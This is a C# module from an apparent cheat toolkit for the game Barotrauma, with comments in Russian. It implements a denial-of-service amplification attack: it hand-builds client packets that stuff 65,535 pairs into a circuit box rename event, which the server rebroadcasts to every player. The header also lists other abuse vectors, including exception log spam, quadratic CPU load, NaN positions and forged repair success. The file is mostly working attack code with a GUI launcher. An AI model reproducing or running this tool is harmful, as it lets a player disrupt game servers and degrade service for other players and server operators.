// ============================================================================
//  CircuitAmplifierModule.cs — «СХЕМОУСИЛИТЕЛЬ» (волна 726, ИЗОБРЕТЁННЫЙ CVE)
//  Bandwidth amplification через CircuitBox RenameConnections broadcast.
//
//  МЕХАНИКА (полный аудит CircuitBox.ServerEventRead, волна 726):
//    энти-событие → Item.EventType.ComponentState(0) + componentIndex +
//    CircuitBoxOpcode.RenameConnections(15) + CircuitBoxRenameConnectionLabelsEvent{
//      Type (enum), NetDictionary<string,string> (до 65535 пар — кламп ArrayMaxSize)}
//    сервер: ToDictionary + RenameConnectionLabelsInternal + CreateServerEvent(data)
//    → СЕРВЕР БРОДКАСТИТ ТЕ ЖЕ 65535 ПАР ВСЕМ ИГРОКАМ В РАУНДЕ.
//
//  АМПЛИФИКАЦИЯ:
//    1 пакет атакующего ≈ 65535 пар × 4Б ≈ 256KB
//    сервер отдаёт: 256KB × N игроков (энти-события шлются всем in-game)
//    16 игроков = ×16 = 4MB исходящего на 256KB входящего
//    рейты: пакеты энти-событий считаются DoSProtection'ом по ШТУКАМ
//    (66/мин не лимитируют объём!) — 66 × 256KB = 17MB/s вход на капе
//    + КАЖДЫЙ клиент парсит 65535 строк (ToDictionary) = CPU-жжение у всех.
//
//  ОГРАНИЧЕНИЯ (честно):
//    - нужен доступ к схембоксу: CanClientAccess (рядом/держишь) + не Locked
//    - RenameConnectionLabelsInternal применит словарь к IO-подписям
//      (на 2 ноды — остальное вылетит в трубу)
//    - строки в парах читаются varuint+UTF8 (пустые пары = 4 байта)
//    - это гриф СВОЕГО экипажа: игроки той же субмарины
//
//  ПОПУТНЫЕ НАХОДКИ АУДИТА (726):
//    - RenameConnections с ДУБЛИКАТАМИ КЛЮЧЕЙ: сервер ToDictionary кидает
//      ArgumentException ДО бродкаста → безлимитный спам исключений в лог
//      (энти-события НЕ имеют чат-спам-фильтра; кап 66 пак/с)
//    - Fabricator: fabricationRecipes[recipeHash] — indexer-throw на
//      неизвестном хэше (тот же класс, лог-спам)
//    - SelectWires/SelectComponents: 65535 ID × Contains = O(n²) CPU
//    - MoveComponent: MoveAmount raw Vector2 (NaN двигает узлы в NaN)
//    - Repairable: QTESuccess — клиент САМ заявляет успех мини-игры
//      (авто-ремонт читерской скоростью = by-design trust)
//
//  ТЕХНИКА ОТПРАВКИ: конверт как в EventBomb (ручная SegmentTable) +
//  ComponentState(0) + componentIndex (ищем CircuitBoxComponent по ItemList
//  рефлексией) + opcode(15) + Type byte(0=Input) + varuint count + пары.
//  Пары строим УНИКАЛЬНЫМИ ключами (иначе сервер throw до бродкаста!).
// ============================================================================

using System;
using System.Text;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class CircuitAmplifierModule : CSModuleBase
    {
        public override string Id   => "circuit_amplifier";
        public override string Name => "Circuit Amplifier";
        public override string Description =>
            "INVENTED CVE: CircuitBox RenameConnections broadcasts your NetDictionary to EVERY player. " +
            "65535 pairs/packet = 256KB in -> 256KB x N players out (x16 on 16p server) + parse burn " +
            "on every client. Packet-count DoS cap doesn't limit VOLUME. Needs circuit box access (unlocked).";
        public override string Category => "exploit";

        public override string GetLabel() => "Circuit Amplifier 📢";

        private static GUIMessageBox _box;
        private static GUITextBox _packetsBox;
        private static GUITextBlock _status;

        public override void OnClick()
        {
            if (_box != null) { _box.Close(); _box = null; return; }
            Open();
        }

        private static void Open()
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[CircAmp] нет подключения", Color.Red);
                return;
            }
            if (GameMain.NetworkMember != null && !GameMain.NetworkMember.GameStarted)
            {
                GUI.AddMessage("[CircAmp] нужен раунд и доступ к схембоксу", Color.Orange);
            }

            _box = new GUIMessageBox(
                headerText: "CIRCUIT AMPLIFIER — усиление трафика через схембокс",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.68f, 0.5f));

            var content = _box.Content;
            content.ClearChildren();

            new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.3f), content.RectTransform),
                "RenameConnections бродкастит твой словарь ВСЕМ игрокам:\n" +
                "1 пакет (256KB, 65535 пар) → 256KB × N игроков исходящего у сервера\n" +
                "+ каждый клиент парсит 65535 строк (ToDictionary).\n" +
                "⚠ Нужен открытый схембокс рядом. Дубликаты ключей = throw до бродкаста!",
                textAlignment: Alignment.CenterLeft, wrap: true, font: GUIStyle.SmallFont)
            { TextColor = new Color(200, 160, 120) };

            var row = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.13f), content.RectTransform),
                isHorizontal: true);
            row.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.3f, 1f), row.RectTransform),
                "Пакетов:", textAlignment: Alignment.CenterRight);
            _packetsBox = new GUITextBox(
                new RectTransform(new Vector2(0.2f, 1f), row.RectTransform),
                "10");
            new GUITextBlock(
                new RectTransform(new Vector2(0.48f, 1f), row.RectTransform),
                "(×256KB ≈ 2.5MB→×N игрокам)", font: GUIStyle.SmallFont)
            { CanBeFocused = false, TextColor = Color.Gray };

            var sendBtn = new GUIButton(
                new RectTransform(new Vector2(0.97f, 0.18f), content.RectTransform),
                "📢 УСИЛИТЬ (отправить пачку)");
            sendBtn.Color = new Color(180, 90, 50);
            sendBtn.OnClicked = (b, d) =>
            {
                int n = int.TryParse(_packetsBox?.Text?.Trim(), out int v) ? Math.Clamp(v, 1, 60) : 10;
                Fire(n);
                return true;
            };

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.16f), content.RectTransform),
                "Статус: ищу схембокс...", wrap: true, font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);
        }

        private static void SetStatus(string text)
        {
            if (_status != null) { _status.Text = "→ " + text; }
            GUI.AddMessage("[CircAmp] " + text, Color.Orange);
        }

        private static void Fire(int packets)
        {
            // ищем схембокс: предмет с CircuitBoxComponent
            Item box = null;
            object boxComp = null;
            var tCircuitBox = typeof(GameMain).Assembly.GetType("Barotrauma.Items.Components.CircuitBoxComponent", false);
            if (tCircuitBox == null) { SetStatus("рефлексия: CircuitBoxComponent не найден"); return; }

            foreach (Item it in Item.ItemList)
            {
                if (it == null || it.Removed) { continue; }
                foreach (ItemComponent comp in it.components)
                {
                    if (comp != null && tCircuitBox.IsInstanceOfType(comp))
                    {
                        box = it;
                        boxComp = comp;
                        break;
                    }
                }
                if (box != null) { break; }
            }
            if (box == null)
            {
                SetStatus("схембокс не синхронизирован (не в раунде или слишком далеко от всех коробок)");
                return;
            }

            int compIndex = box.components.IndexOf(boxComp as ItemComponent);
            if (compIndex < 0) { SetStatus("componentIndex не найден"); return; }

            ushort myEntityId = box.ID;
            ushort mirror = GameMain.Client.LastSentEntityEventID;

            int sent = 0;
            for (int i = 0; i < packets; i++)
            {
                ushort eventId = (ushort)(mirror + 1 + (i % 3)); // 3 кандидата как в EventBomb
                if (SendOne(myEntityId, eventId, (byte)compIndex)) { sent++; }
                else { break; }
            }
            SetStatus($"{sent}/{packets} пакетов по 65535 пар (~{sent * 256}KB → ×N игрокам). " +
                "Смотри сеть сервера (upstream) и лаги клиентов.");
        }

        private static bool SendOne(ushort entityId, ushort eventId, byte componentIndex)
        {
            try
            {
                // --- тело события в temp-буфер (формат NetEntityEventManager.Write) ---
                var temp = new WriteOnlyMessage();
                temp.WriteUInt16(0);       // characterStateID (сервер читает первым)
                temp.WriteByte(0);         // Item.EventType.ComponentState == 0
                temp.WriteByte(componentIndex);
                temp.WriteByte(15);        // CircuitBoxOpcode.RenameConnections (internal → литерал)
                temp.WriteByte(0);         // IO Type = Input (enum ranged)

                const int pairCount = 65535;
                temp.WriteVariableUInt32(pairCount);
                // ключи УНИКАЛЬНЫ (дубликаты = ArgumentException ДО бродкаста!)
                // минимальная пара: varuint(1)+key(4B) + varuint(1)+val(1B) = 7Б
                for (uint i = 0; i < pairCount; i++)
                {
                    temp.WriteVariableUInt32(4);
                    temp.WriteByte((byte)(48 + (i & 15)));
                    temp.WriteByte((byte)(48 + ((i >> 4) & 15)));
                    temp.WriteByte((byte)(48 + ((i >> 8) & 15)));
                    temp.WriteByte((byte)(48 + ((i >> 12) & 15)));
                    temp.WriteVariableUInt32(1);
                    temp.WriteByte((byte)'x');
                }
                int tempLen = temp.LengthBytes; // включает charStateID (сервер: ReadBytes(len-2))

                // --- конверт: UPDATE_INGAME + SegmentTable{EntityState} ---
                var msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.UPDATE_INGAME);
                msg.WriteBoolean(true);
                msg.WritePadBits();

                int pointerLocation = msg.BitPosition;
                msg.WriteInt32(0); // table pointer placeholder

                int segmentStart = msg.BitPosition;
                msg.WritePadBits();
                msg.WriteUInt16(eventId);
                msg.WriteByte(1); // eventCount
                msg.WriteUInt16(entityId);
                msg.WriteVariableUInt32((uint)tempLen);           // точная длина события
                msg.WriteBytes(temp.Buffer, 0, tempLen);

                int tablePosition = msg.BitPosition;
                msg.BitPosition = pointerLocation;
                msg.WriteInt32(tablePosition - pointerLocation);
                msg.BitPosition = tablePosition;

                msg.WriteUInt16(1); // segment count
                var asm = typeof(GameMain).Assembly;
                var tEnum = asm.GetType("Barotrauma.Networking.ClientNetSegment", false);
                var tSegOpen = asm.GetType("Barotrauma.Networking.Segment`1", false);
                var tSeg = tSegOpen.MakeGenericType(tEnum);
                var ci = tSeg.GetConstructor(new[] { tEnum, typeof(int) });
                object segment = ci.Invoke(new[] { Enum.Parse(tEnum, "EntityState"), (object)(segmentStart - pointerLocation) });
                typeof(INetSerializableStruct).GetMethod("Write").Invoke(segment, new object[] { msg });

                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
                return true;
            }
            catch (Exception e)
            {
                GUI.AddMessage("[CircAmp] send fail: " + e.Message, Color.Red);
                return false;
            }
        }

    }
}
